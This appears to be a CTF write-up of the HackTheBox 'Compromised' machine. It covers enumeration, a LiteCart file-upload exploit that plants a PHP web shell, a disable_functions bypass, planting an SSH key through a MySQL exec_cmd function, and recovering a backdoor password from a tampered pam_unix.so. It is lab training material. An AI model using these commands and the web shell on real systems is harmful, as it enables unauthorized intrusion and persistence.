---
title: "HackTheBox — Compromised Writeup"
date: 2020-10-22 10:50:00 +0530
categories: [Hackthbox,Machine,Linux]
tags: [gobuster,Litecart,CVE-2018-12256,Ghidra,ed25519]
image: /images/compromised/icon.png
---
> Compromised from HackTheBox is an hard linux machine.it is an amazing box. We'll start with basic enumeration with nmap as usual.

## Reconnaissance

Let's begin with `nmap` to discover open ports and services:

```shell
nmap -sC -sV 10.10.10.207 -on=nmap.txt
# Nmap 7.80 scan initiated Tue Oct  6 20:38:54 2020 as: nmap -sC -sV -oN=nmap.txt 10.10.10.207
Nmap scan report for 10.10.10.207
Host is up (0.26s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)
|   256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)
|_  256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Legitimate Rubber Ducks | Online Store
|_Requested resource was http://10.10.10.207/shop/en/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct  6 20:39:49 2020 -- 1 IP address (1 host up) scanned in 54.46 seconds

```
Based on the scan results we can see port  `22 and 80` are open, so lets check 80 first.

## HTTP - Port 80

Looking at https://10.10.10.209 we found the `info@doctors.htb`.

`home page`
![website](/images/compromised/1website.png)

nothing very jouicy is found on website. 
lets run gobuster and check for hidden directory .


```shell
┌─[oxy@oxy]─[~/Practice/hackthebox/machine/compromized]
└──╼ $gobuster dir -u http://10.10.10.207 -w /usr/share/wordlists/dirb/common.txt
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/backup (Status: 301)
/index.php (Status: 302)
/server-status (Status: 403)
/shop (Status: 301)
```

got an `/backup` path . lets check this .
![backup](/images/compromised/2backup.png)

and we got the backup of a source code.
lets extract this and check the code.


```shell
┌─[oxy@oxy]─[~/Practice/hackthebox/machine/compromized/backup/shop]
└──╼ $tar xvf a.tar.gz 
┌─[oxy@oxy]─[~/Practice/hackthebox/machine/compromized/backup]
└──╼ $ls
a.tar.gz  shop
┌─[oxy@oxy]─[~/Practice/hackthebox/machine/compromized/backup]
└──╼ $cd shop/
┌─[oxy@oxy]─[~/Practice/hackthebox/machine/compromized/backup/shop]
└──╼ $ls
admin  cache  data  ext  favicon.ico  images  includes  index.php  logs  pages  robots.txt  vqmod
```

admin/login.php gives a log file locations `./.log2301c9430d8593ae.txt`
on visting this page on browser gives of admin credintials.
`http://10.10.10.207/shop/admin/.log2301c9430d8593ae.txt`

User: admin Passwd: theNextGenSt0r3!~

![creds](/images/compromised/3adminpass.png)

also got password salt from `includes/config.php` file
```shell
// Password Encryption Salt
  define('PASSWORD_SALT', 'kg1T5n2bOEgF8tXIdMnmkcDUgDqOLVvACBuYGGpaFkOeMrFkK0BorssylqdAP48Fzbe8ylLUx626IWBGJ00ZQfOTgPnoxue1vnCN1amGRZHATcRXjoc6HiXw0uXYD9mI');
```

lets login to admin page `http://10.10.10.207/shop/admin/`.
![creds](/images/compromised/5login.png)
![admin](/images/compromised/6adminpanel.png)

### CVE-2018-12256

we found the  litecart version  is 2.1.2 from admin page.
and i got an expoit for this version `LiteCart 2.1.2 - Arbitrary File Upload`  check  [[**CVE-2018-12256**]](https://www.exploit-db.com/exploits/45267
).


```shell
┌─[oxy@oxy]─[~/Practice/hackthebox/machine/compromized/exploit]                                
└──╼ $python litecart.py -p'theNextGenSt0r3!~' -u admin -t http://10.10.10.207/shop/admin/
Shell => http://10.10.10.207/shop/admin/../vqmod/xml/HFPEY.php?c=id                             
```
but this doesn't give us anything.
![noshell](/images/compromised/noshell.png)

lets check why this expoit doesn't work for us .
lets our exploit to check `phpinfo`.

change this line

```shell
<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); } ?>
```

to

```shell
<?php phpinfo(); ?>
```
and exploit again.


```shell
┌─[oxy@oxy]─[~/Practice/hackthebox/machine/compromized/exploit]                              
└──╼ $python litecart.py -p'theNextGenSt0r3!~' -u admin -t http://10.10.10.207/shop/admin/
Shell => http://10.10.10.207/shop/admin/../vqmod/xml/CETHV.php?c=id   
```

![phpinfo](/images/compromised/phpinfo.png)

this gives disable function list , our exploit is not working because of this reason.
![functions](/images/compromised/disabled_function.png)


### Bypassing disabled function

luckily we can bypass these disabled function.
check and copy [[**This**]](https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html) code.
visit `http://10.10.10.207/shop/admin/?app=vqmods&doc=vqmods`.
![uplaod](/images/compromised/7upload.png)

fireup burp and upload it.

lets modify our exploit to work best with our case.
change this line.
![uplaod](/images/compromised/change_this_line.png)

```shell
if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); pwn($cmd); echo "</pre>";}
```
looks like 

![uplaod](/images/compromised/rce.png)

and check http://10.10.10.207/shop/vqmod/xml/bypass.php also don't forget to change content type to xml from php in brup.
we got a working `RCE`.

![uplaod](/images/compromised/passwd.png)

### mysql table
we can verify there is a mysql user has bash shell on machine.
lets hunt for mysql creds.
if we go back to backup files, we got the mysql creds on   `/includes/config.inc.php`.


```shell
// Database
  define('DB_TYPE', 'mysql');
  define('DB_SERVER', 'localhost');
  define('DB_USERNAME', 'root');
  define('DB_PASSWORD', 'changethis');
  define('DB_DATABASE', 'ecom');
  define('DB_TABLE_PREFIX', 'lc_');
  define('DB_CONNECTION_CHARSET', 'utf8');
  define('DB_PERSISTENT_CONNECTIONS', 'false');
```

user: root
password: changethis


now we have mysql creds we can use this creds to upoad files with the help of mysql table function , check [[**This**]](https://mariadb.com/kb/en/mysqlfunc-table/
) to know more about mysql table functions.
lets check which function are avaiable to us with this command.

```shell
mysql -u root -pchangethis -e “SELECT * FROM mysql.func;
```

![exec_cmd](/images/compromised/passwd.png)

`exec_cmd` is available to us lets use this to write ssh key in the mysql users authorizd keys and create a tunnel.

let first create `ed25519 ssh key`.

```shell
┌─[✗]─[oxy@oxy]─[~/.ssh]
└──╼ $ssh-keygen -t ed25519
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/oxy/.ssh/id_ed25519): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/oxy/.ssh/id_ed25519
Your public key has been saved in /home/oxy/.ssh/id_ed25519.pub
The key fingerprint is:
The key's randomart image is:
+--[ED25519 256]--+
|                 |
|                 |
|              o  |
|           . . B |
|        S   E +o%|
|       o . oo. X%|
|        =....++B=|
|       ..+++oo= B|
|        .=B+o .*+|
+----[SHA256]-----+

┌─[oxy@oxy]─[~/.ssh]
└──╼ $ls
id_rsa  id_rsa.pub
```

now copy the ssh keys to mysql authorized_keys.

```shell
mysql -u root -pchangethis -e "select exec_cmd('mkdir /var/lib/mysql/.ssh')"

mysql -u root -pchangethis -e "select exec_cmd('echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBXWErI5Vfmz4Ok6OQ7Bz1oSIfHcG6Vh2P77Kulu4Kgj oxy@oxy > /var/lib/mysql/.ssh/authorized_keys')"


```

![ssh](/images/compromised/sshkey.png)

### Mysql Shell

lets ssh with public keys

```shell
┌─[✗]─[oxy@oxy]─[~/.ssh]
└──╼ $ssh -i id_ed25519 mysql@10.10.10.207
Last login: Sat Oct 17 04:05:31 2020 from 10.10.14.6
mysql@compromised:~$ whoami
mysql
```

## User

### Enumeration

lets enum for user
check the sysadmin user creds.

`grep -nlri sysadmin`

```shell
mysql@compromised:~$ cat strace-log.dat | grep password
22102 03:11:06 write(2, "mysql -u root --password='3*NLJE"..., 39) = 39
22227 03:11:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */) = 0
22227 03:11:09 write(2, "[Warning] Using a password on th"..., 73) = 73
22102 03:11:10 write(2, "mysql -u root --password='3*NLJE"..., 39) = 39
22228 03:11:15 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=changeme"], 0x55bc62467900 /* 21 vars */) = 0
22228 03:11:15 write(2, "[Warning] Using a password on th"..., 73) = 73
22102 03:11:16 write(2, "mysql -u root --password='change"..., 35) = 35
22229 03:11:18 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=changethis"], 0x55bc62467900 /* 21 vars */) = 0
22229 03:11:18 write(2, "[Warning] Using a password on th"..., 73) = 73
22232 03:11:52 openat(AT_FDCWD, "/etc/pam.d/common-password", O_RDONLY) = 5
22232 03:11:52 read(5, "#\n# /etc/pam.d/common-password -"..., 4096) = 1440
22232 03:11:52 write(4, "[sudo] password for sysadmin: ", 30) = 30
```

we got password for mysql

`mysql", "-u", "root", "--password=3*NLJE32I$Fe`

lets use this creds for sysadmin.

```shell
mysql@compromised:~$ su sysadmin
Password: 
sysadmin@compromised:/var/lib/mysql$ whoami
sysadmin
sysadmin@compromised:/var/lib/mysql$ cd
sysadmin@compromised:~$ ls
user.txt
```
and we got the user.

## Elevating privilige: sysadmin -> root

### Enumeration

As the machine name is compromised , lets check what files are changed when this machine was compromised.


```shell
sysadmin@compromised:~$ dpkg -V 2>/dev/null
??5??????   /boot/System.map-4.15.0-99-generic
??5?????? c /etc/apache2/apache2.conf
??5?????? c /etc/apache2/sites-available/000-default.conf
??5??????   /boot/vmlinuz-4.15.0-101-generic
??5?????? c /etc/sudoers
??5?????? c /etc/sudoers.d/README
??5?????? c /etc/at.deny
??5?????? c /etc/iscsi/iscsid.conf
??5??????   /boot/vmlinuz-4.15.0-99-generic
??5??????   /bin/nc.openbsd
??5??????   /boot/System.map-4.15.0-101-generic
??5??????   /var/lib/polkit-1/localauthority/10-vendor.d/systemd-networkd.pkla
??5??????   /lib/x86_64-linux-gnu/security/pam_unix.so
??5?????? c /etc/apparmor.d/usr.sbin.mysqld
??5?????? c /etc/mysql/mysql.conf.d/mysqld.cnf
```


`pam_unix.so` looks intresting , lets check this one first 
`??5??????   /lib/x86_64-linux-gnu/security/pam_unix.so`.

lets copy this file to our machine and enum.

```shell
sysadmin@compromised:~$ cp /lib/x86_64-linux-gnu/security/pam_unix.so /dev/shm

┌─[oxy@oxy]─[~/Practice/hackthebox/machine/compromized]
└──╼ $scp sysadmin@10.10.10.207:/dev/shm/pam_unix.so .
sysadmin@10.10.10.207's password: 
pam_unix.so                                                                                                                                                 100%  194KB  90.1KB/s   00:02    
┌─[oxy@oxy]─[~/Practice/hackthebox/machine/compromized]
└──╼ $
```
lets fire ghidra a load this file.


![ghirda](/images/compromised/ghirda.png)


we got an intresting function `pam_sm_authenticate`.
here we got two backdoor strings and `_unix_verify_password` after string.
so this must be creds seten for backdoor  after compromising the machine.

```shell
        if (iVar2 == 0) {
          backdoor._0_8_ = 0x4533557e656b6c7a;
          backdoor._8_7_ = 0x2d326d3238766e;
          local_40 = 0;
          iVar2 = strcmp((char *)p,backdoor);
          if (iVar2 != 0) {
            iVar2 = _unix_verify_password(pamh,name,(char *)p,ctrl);
          }
```
lets convert these tow backdoor string into char sequence.
we can do it in ghidra , right click on the string and convert.

![ghirda](/images/compromised/convert.png)

we get `zlke~U3E` and `nv82m2-`
combining both we get `zlke~U3Env82m2-`


### ROOT

lets check this password for root.


```shell
mysql@compromised:~$ su root
Password: 
root@compromised:/var/lib/mysql# cd 
root@compromised:~# ls
root.txt
```

And we pwned the Box !

Thanks for reading.
